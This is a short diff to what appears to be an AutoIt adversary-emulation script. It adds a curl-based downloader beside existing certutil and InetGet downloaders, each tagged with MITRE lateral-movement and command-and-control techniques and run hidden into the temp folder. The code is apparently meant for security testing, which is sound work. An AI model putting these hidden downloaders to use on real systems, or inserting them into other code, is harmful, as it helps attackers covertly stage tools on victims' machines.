@@ -269,6 +269,12 @@ Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:dow
    InetGet($sURL, $FileName, 1, 1)
 EndFunc
 
+Func CurlDownloader($url, $filePath = @TempDir & "\tools.ext") ;DESCRIPTION:use Curl to download file;MITRE:LateralMovement,CommandAndControl
+   ;If Not FileExists($filePath) Then
+	  RunWait("curl " & $url & " --output " & $filePath,"" ,@SW_HIDE)
+   ;EndIf
+EndFunc
+
 Func CertUtilDownloader($url, $filePath = @TempDir & "\tools.ext") ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
    ;If Not FileExists($filePath) Then
 	  RunWait("certutil.exe -urlcache -f " & $url & " " & $filePath,"" ,@SW_HIDE)
